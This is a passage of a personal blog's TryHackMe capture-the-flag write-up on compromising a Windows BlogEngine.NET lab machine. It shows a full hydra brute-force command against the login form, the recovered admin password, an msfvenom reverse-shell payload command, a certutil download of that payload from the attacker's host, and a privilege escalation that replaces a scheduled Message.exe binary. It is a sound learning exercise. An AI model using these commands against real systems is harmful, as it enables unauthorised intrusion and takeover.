+<pre tabindex="0"><code>&#34;/Account/login.aspx:__VIEWSTATE=vTEGEhWaMSkYpJxnYRcsEwldVEjlvYM6WqpOAx1NfYQPxNyQ4zXFXr%2Fza5tvCHi1SM306YGu4Uc7qGyMC9pJ%2B%2FRQEBzzBUsho4whVX4CbhZzzY%2Fsb8Ww76WQu8cHpvppQ7gBCSiYWGMzwJDnJ8BWIXo73peBkzDqZdIWRI1bc6bUJWzziTgItFwPLC3IarpP8JgqnRk5UrUPNDfiG8ZxiGiGCUxWVUUJ7CdG6EwYNPYDIAcMWcUjFWb2A7iG8ru%2F0BtNKQOVMbv%2BUouXMj3MHFTYC%2FWQv21ZPQF0JNqP7B8YAixf1YPbVX0IQGSfJKujS5ujkr2iZo8GCRslsnbQlHetNZKvVSwqNDZTT0CUcmnKNr%2BO&amp;__EVENTVALIDATION=luSIModQouaXwBUZ3ewZVbYRemGqC%2Bqshym%2FHORkGPw9mj66TR3pzV8n9i3EYgjEY8DiHt%2By0Bubsj5nBrvl5LcfglN2%2Fdh%2FtCUjyzUquslWipgaKmftx3r9ErXuD%2FK2t0vBkGh1UiG16TGFyA9TLlC%2BPLnew%2F0vW39dssS%2FveOZ7fEx&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login
+failed&#34;
+</code></pre><p>The &lsquo;VIEWSTATE&rsquo; part is from the request payload you can see from the inspector
+of your web-browser.</p>
+<p>The command I used:</p>
+<pre tabindex="0"><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.170.188
+http-post-form
+&#34;/Account/login.aspx:__VIEWSTATE=vTEGEhWaMSkYpJxnYRcsEwldVEjlvYM6WqpOAx1NfYQPxNyQ4zXFXr%2Fza5tvCHi1SM306YGu4Uc7qGyMC9pJ%2B%2FRQEBzzBUsho4whVX4CbhZzzY%2Fsb8Ww76WQu8cHpvppQ7gBCSiYWGMzwJDnJ8BWIXo73peBkzDqZdIWRI1bc6bUJWzziTgItFwPLC3IarpP8JgqnRk5UrUPNDfiG8ZxiGiGCUxWVUUJ7CdG6EwYNPYDIAcMWcUjFWb2A7iG8ru%2F0BtNKQOVMbv%2BUouXMj3MHFTYC%2FWQv21ZPQF0JNqP7B8YAixf1YPbVX0IQGSfJKujS5ujkr2iZo8GCRslsnbQlHetNZKvVSwqNDZTT0CUcmnKNr%2BO&amp;__EVENTVALIDATION=luSIModQouaXwBUZ3ewZVbYRemGqC%2Bqshym%2FHORkGPw9mj66TR3pzV8n9i3EYgjEY8DiHt%2By0Bubsj5nBrvl5LcfglN2%2Fdh%2FtCUjyzUquslWipgaKmftx3r9ErXuD%2FK2t0vBkGh1UiG16TGFyA9TLlC%2BPLnew%2F0vW39dssS%2FveOZ7fEx&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login
+failed&#34;
+</code></pre><p>I was able to get <code>admin:1qaz2wsx</code></p>
+<h2 id="compromise-the-machine">Compromise the machine<a hidden class="anchor" aria-hidden="true" href="#compromise-the-machine">#</a></h2>
+<p>Since we have a credential to use, we will use
+<a href="https://exploit-db.com">exploit-db.com</a> to get initial access on the target
+machine. #Exploit-db is a #CVE (common vulnerability and exposures) archive of
+public exploits and corresponding vulnerable software, developed for the use of
+penetration testers and vulnerability researches (owned by Offensive Security).</p>
+<p>So, if we login using the admin credential, we can see that the service is
+<code>blogengine.net</code> with version 3.3.6.0. Let&rsquo;s search for some exploits using
+<code>searchsploit</code>.</p>
+<p><a href="https://www.exploit-db.com/exploits/46353">This exploit</a> is simple enough
+to follow. The instruction tells me how to upload a file to the existing
+post - download the .cs file provided and modify it so it includes our
+machine (or the attacker&rsquo;s machine IP address and the port) and rename it to
+PostView.ascx. Then finally go to the address
+<code>http://&lt;IP&gt;/?theme=../../App_Data/files</code>. If everything is done properly,
+your <code>nc</code> listener should have the connection.</p>
+<h2 id="windows-privilege-escalation">Windows Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#windows-privilege-escalation">#</a></h2>
+<p>Although we have a shell, the shell behaves abnormally. So, we would need to
+upload a shell generated by msfvenom then use that shell to have a stable
+connection.</p>
+<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.14.223 LPORT=2345 -f exe -o rev.exe</code> will get us the reverse shell. And we will move this onto the victim
+machine by running <code>certutil.exe -urlcache -split -f &quot;http://10.13.14.223:8000/rev.exe&quot; %tmp%\rev.exe</code>. This will put the file onto
+<code>C:\Windows\Temp</code> directory.</p>
+<p>Running <code>rev.exe</code> will give us a better shell on <code>nc</code> listener 2345.</p>
+<p>The next question asks what is the name of the abnormal service running. In
+order to find out about this, moving <code>WinPEAS</code> onto the target machine then have
+it enumerate the machine.</p>
+<p>After running <code>WinPEAS</code>, I looked through the services running on the system and
+this one system caught my eye:</p>
+<pre tabindex="0"><code>WindowsScheduler(Splinterware Software Solutions - System Scheduler
+Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running File Permissions:
+Everyone [WriteData/CreateFiles] Possible DLL Hijacking in binary folder:
+C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
+</code></pre><p><code>WindowsScheduler</code> file permission is <code>Everyone</code> and it says <code>Possible DLL Hijacking in binary folder</code>.</p>
+<p>Let&rsquo;s move into the directory then. In the binary folder, you can see a few
+<code>.dll</code> files. However, the module&rsquo;s question asks what the name of the binary we
+are supposed to exploit. So I would assume that would be scheduler.exe or
+wscheduler.exe, but they were not. The hint suggest to look at the log of this
+abnormal service. I moved into <code>Events</code> directory and I found out this file
+<code>&lt;whatever the number was&gt;.INI_LOG.txt</code>.</p>
+<p>The parts of the log shows:</p>
+<pre tabindex="0"><code>06/20/23 20:30:33,Process Ended. PID:1848,ExitCode:4,Message.exe
+(Administrator) 06/20/23 20:31:01,Event Started Ok, (Administrator) 06/20/23
+20:31:33,Process Ended. PID:848,ExitCode:4,Message.exe (Administrator) 06/20/23
+20:32:01,Event Started Ok, (Administrator) 06/20/23 20:32:33,Process Ended.
+PID:2376,ExitCode:4,Message.exe (Administrator) 06/20/23 20:33:01,Event Started
+Ok, (Administrator) 06/20/23 20:33:33,Process Ended.
+PID:1636,ExitCode:4,Message.exe (Administrator)
+</code></pre><p>It runs <code>Message.exe</code>! This suggests that if we can overwrite this file with our
+own executable (with the same name), we can run that executable as the
+Administrator privilege.</p>
+<p>I crafted a new reverse shell with a different port number and moved that shell
+into the directory (also changed the name of the shell to <code>Message.exe</code>). A few
+moments later, I was able to see this:</p>
+<pre tabindex="0"><code>└─$ nc -lnvp 5678 listening on [any] 5678 ... connect to [10.13.14.223] from
+(UNKNOWN) [10.10.123.161] 49339 Microsoft Windows [Version 6.3.9600] (c) 2013
+Microsoft Corporation. All rights reserved.
+
+C:\PROGRA~2\SYSTEM~1&gt;dir dir Volume in drive C has no label. Volume Serial
+Number is 0E97-C552
+
+Directory of C:\PROGRA~2\SYSTEM~1
+</code></pre><p>With this new connection with escalated privilege, I was able to get the user
+flag and the root flag.</p>
+<hr>
+<p>Another interesting Windows box with using different tools to exploit a system.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/tryhackme/">TryHackMe</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/cybersecurity/">Cybersecurity</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/windows/">Windows</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/rce/">RCE</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/hydra/">Hydra</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/winpeas/">Winpeas</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
